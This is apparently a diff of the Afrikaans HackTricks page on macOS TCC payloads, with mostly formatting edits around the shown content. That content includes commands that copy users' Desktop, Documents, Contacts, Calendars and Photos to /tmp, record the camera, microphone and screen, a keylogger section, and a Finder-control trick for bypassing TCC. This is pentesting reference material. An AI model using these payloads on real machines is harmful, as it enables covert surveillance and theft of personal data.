@@ -1,4 +1,4 @@
-# macOS TCC-pakette
+# macOS TCC Payloads
 
 <details>
 
@@ -9,7 +9,7 @@ Ander maniere om HackTricks te ondersteun:
 * As jy jou **maatskappy geadverteer wil sien in HackTricks** of **HackTricks in PDF wil aflaai**, kyk na die [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
 * Kry die [**amptelike PEASS & HackTricks swag**](https://peass.creator-spring.com)
 * Ontdek [**The PEASS Family**](https://opensea.io/collection/the-peass-family), ons versameling eksklusiewe [**NFTs**](https://opensea.io/collection/the-peass-family)
-* **Sluit aan by die** 💬 [**Discord-groep**](https://discord.gg/hRep4RUj7f) of die [**telegram-groep**](https://t.me/peass) of **volg** ons op **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
+* **Sluit aan by die** 💬 [**Discord-groep**](https://discord.gg/hRep4RUj7f) of die [**telegram-groep**](https://t.me/peass) of **volg** ons op **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
 * **Deel jou hacktruuks deur PR's in te dien by die** [**HackTricks**](https://github.com/carlospolop/hacktricks) en [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHub-opslagplekke.
 
 </details>
@@ -22,6 +22,7 @@ Ander maniere om HackTricks te ondersteun:
 {% tabs %}
 {% tab title="Objective-C" %}
 Kopieer `$HOME/Desktop` na `/tmp/desktop`.
+
 ```objectivec
 #include <syslog.h>
 #include <stdio.h>
@@ -57,6 +58,7 @@ fclose(stderr); // Close the file stream
 
 {% tab title="Shell" %}
 Kopieer `$HOME/Desktop` na `/tmp/desktop`.
+
 ```bash
 cp -r "$HOME/Desktop" "/tmp/desktop"
 ```
@@ -71,6 +73,7 @@ cp -r "$HOME/Desktop" "/tmp/desktop"
 {% tabs %}
 {% tab title="ObjetiveC" %}
 Kopieer `$HOME/Documents` na `/tmp/documents`.
+
 ```objectivec
 #include <syslog.h>
 #include <stdio.h>
@@ -106,6 +109,7 @@ fclose(stderr); // Close the file stream
 
 {% tab title="Shell" %}
 Kopieer `$HOME/`Documents na `/tmp/documents`.
+
 ```bash
 cp -r "$HOME/Documents" "/tmp/documents"
 ```
@@ -118,8 +122,11 @@ cp -r "$HOME/Documents" "/tmp/documents"
 * **TCC**: `kTCCServiceSystemPolicyDownloadsFolder`
 
 {% tabs %}
-{% tab title="ObjetiveC" %}
+{% tab title="undefined" %}
 Kopieer `$HOME/Downloads` na `/tmp/downloads`.
+{% endtab %}
+
+{% tab title="undefined" %}
 ```objectivec
 #include <syslog.h>
 #include <stdio.h>
@@ -151,8 +158,11 @@ NSLog(@"Copy completed successfully.", error);
 fclose(stderr); // Close the file stream
 }
 ```
+{% endtab %}
+
 {% tab title="Shell" %}
 Kopieer `$HOME/Dowloads` na `/tmp/downloads`.
+
 ```bash
 cp -r "$HOME/Downloads" "/tmp/downloads"
 ```
@@ -167,6 +177,7 @@ cp -r "$HOME/Downloads" "/tmp/downloads"
 {% tabs %}
 {% tab title="ObjetiveC" %}
 Kopieer `$HOME/Pictures/Photos Library.photoslibrary` na `/tmp/photos`.
+
 ```objectivec
 #include <syslog.h>
 #include <stdio.h>
@@ -202,6 +213,7 @@ fclose(stderr); // Close the file stream
 
 {% tab title="Shell" %}
 Kopieer `$HOME/Pictures/Photos Library.photoslibrary` na `/tmp/photos`.
+
 ```bash
 cp -r "$HOME/Pictures/Photos Library.photoslibrary" "/tmp/photos"
 ```
@@ -216,6 +228,7 @@ cp -r "$HOME/Pictures/Photos Library.photoslibrary" "/tmp/photos"
 {% tabs %}
 {% tab title="ObjetiveC" %}
 Kopieer `$HOME/Library/Application Support/AddressBook` na `/tmp/contacts`.
+
 ```objectivec
 #include <syslog.h>
 #include <stdio.h>
@@ -251,6 +264,7 @@ fclose(stderr); // Close the file stream
 
 {% tab title="Shell" %}
 Kopieer `$HOME/Library/Application Support/AddressBook` na `/tmp/contacts`.
+
 ```bash
 cp -r "$HOME/Library/Application Support/AddressBook" "/tmp/contacts"
 ```
@@ -265,6 +279,7 @@ cp -r "$HOME/Library/Application Support/AddressBook" "/tmp/contacts"
 {% tabs %}
 {% tab title="ObjectiveC" %}
 Kopieer `$HOME/Library/Calendars` na `/tmp/calendars`.
+
 ```objectivec
 #include <syslog.h>
 #include <stdio.h>
@@ -300,12 +315,15 @@ fclose(stderr); // Close the file stream
 
 {% tab title="Shell" %}
 Kopieer `$HOME/Library/Calendars` na `/tmp/calendars`.
+
 ```bash
 cp -r "$HOME/Library/Calendars" "/tmp/calendars"
 ```
+
 {% tabs %}
 {% tab title="ObjetiveC - Opne" %}
 Neem 'n 3s video op en stoor dit in **`/tmp/recording.mov`**
+
 ```objectivec
 #import <Foundation/Foundation.h>
 #import <AVFoundation/AVFoundation.h>
@@ -385,6 +403,7 @@ fclose(stderr); // Close the file stream
 
 {% tab title="ObjectiveC - Kontroleer" %}
 Kontroleer of die program toegang het tot die kamera.
+
 ```objectivec
 #import <Foundation/Foundation.h>
 #import <AVFoundation/AVFoundation.h>
@@ -418,13 +437,14 @@ fclose(stderr); // Close the file stream
 
 {% tab title="Shell" %}
 Neem 'n foto met die kamera
+
 ```bash
 ffmpeg -framerate 30 -f avfoundation -i "0" -frames:v 1 /tmp/capture.jpg
 ```
 {% endtab %}
 {% endtabs %}
 
-### Mikrofoon
+#### Mikrofoon
 
 * **Toestemming**: **com.apple.security.device.audio-input**
 * **TCC**: `kTCCServiceMicrophone`
@@ -432,6 +452,7 @@ ffmpeg -framerate 30 -f avfoundation -i "0" -frames:v 1 /tmp/capture.jpg
 {% tabs %}
 {% tab title="ObjectiveC - Opneem" %}
 Neem 5 sekondes van klank op en stoor dit in `/tmp/recording.m4a`
+
 ```objectivec
 #import <Foundation/Foundation.h>
 #import <AVFoundation/AVFoundation.h>
@@ -532,6 +553,7 @@ fclose(stderr); // Close the file stream
 
 {% tab title="ObjectiveC - Kontroleer" %}
 Kontroleer of die app toegang het tot die mikrofoon.
+
 ```objectivec
 #import <Foundation/Foundation.h>
 #import <AVFoundation/AVFoundation.h>
@@ -563,6 +585,7 @@ static void telegram(int argc, const char **argv) {
 
 {% tab title="Shell" %}
 Neem 'n 5s klank op en stoor dit in `/tmp/recording.wav`
+
 ```bash
 # Check the microphones
 ffmpeg -f avfoundation -list_devices true -i ""
@@ -572,7 +595,7 @@ ffmpeg -f avfoundation -i ":1" -t 5 /tmp/recording.wav
 {% endtab %}
 {% endtabs %}
 
-### Ligging
+#### Ligging
 
 {% hint style="success" %}
 Om die ligging te kry, moet **Liggingdienste** (vanaf Privaatheid & Sekuriteit) **geaktiveer wees,** anders sal dit nie toegang daartoe hê nie.
@@ -584,6 +607,7 @@ Om die ligging te kry, moet **Liggingdienste** (vanaf Privaatheid & Sekuriteit) 
 {% tabs %}
 {% tab title="ObjectiveC" %}
 Skryf die ligging in `/tmp/logs.txt`
+
 ```objectivec
 #include <syslog.h>
 #include <stdio.h>
@@ -634,13 +658,14 @@ freopen("/tmp/logs.txt", "w", stderr); // Redirect stderr to /tmp/logs.txt
 
 {% tab title="Shell" %}
 Kry toegang tot die ligging
+
 ```
 ???
 ```
 {% endtab %}
 {% endtabs %}
 
-### Skermopname
+#### Skermopname
 
 * **Toegekende regte**: Geen
 * **TCC**: `kTCCServiceScreenCapture`
@@ -648,6 +673,7 @@ Kry toegang tot die ligging
 {% tabs %}
 {% tab title="ObjectiveC" %}
 Neem die hoofskerm vir 5 sekondes op in `/tmp/screen.mov`
+
 ```objectivec
 #import <Foundation/Foundation.h>
 #import <AVFoundation/AVFoundation.h>
@@ -705,18 +731,20 @@ freopen("/tmp/logs.txt", "w", stderr); // Redirect stderr to /tmp/logs.txt
 
 {% tab title="Shell" %}
 Neem die hoofskerm vir 5 sekondes op
+
 ```bash
 screencapture -V 5 /tmp/screen.mov
 ```
 {% endtab %}
 {% endtabs %}
 
-### Toeganklikheid
+#### Toeganklikheid
 
 * **Voorreg**: Geen
 * **TCC**: `kTCCServiceAccessibility`
 
 Gebruik die TCC-voorreg om die beheer van Finder se druk op enter te aanvaar en sodoende TCC te omseil.
+
 ```objectivec
 #import <Foundation/Foundation.h>
 #import <ApplicationServices/ApplicationServices.h>
@@ -771,6 +799,7 @@ return 0;
 
 {% tab title="Sleutellogger" %}
 Berg die gedrukte sleutels op in **`/tmp/keystrokes.txt`**
+
 ```objectivec
 #import <Foundation/Foundation.h>
 #import <ApplicationServices/ApplicationServices.h>
@@ -890,7 +919,7 @@ Ander maniere om HackTricks te ondersteun:
 * As jy jou **maatskappy geadverteer wil sien in HackTricks** of **HackTricks in PDF wil aflaai**, kyk na die [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
 * Kry die [**amptelike PEASS & HackTricks swag**](https://peass.creator-spring.com)
 * Ontdek [**The PEASS Family**](https://opensea.io/collection/the-peass-family), ons versameling eksklusiewe [**NFTs**](https://opensea.io/collection/the-peass-family)
-* **Sluit aan by die** 💬 [**Discord-groep**](https://discord.gg/hRep4RUj7f) of die [**telegram-groep**](https://t.me/peass) of **volg** ons op **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live).
+* **Sluit aan by die** 💬 [**Discord-groep**](https://discord.gg/hRep4RUj7f) of die [**telegram-groep**](https://t.me/peass) of **volg** ons op **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live).
 * **Deel jou hacktruuks deur PR's in te dien by die** [**HackTricks**](https://github.com/carlospolop/hacktricks) en [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github-repos.
 
 </details>
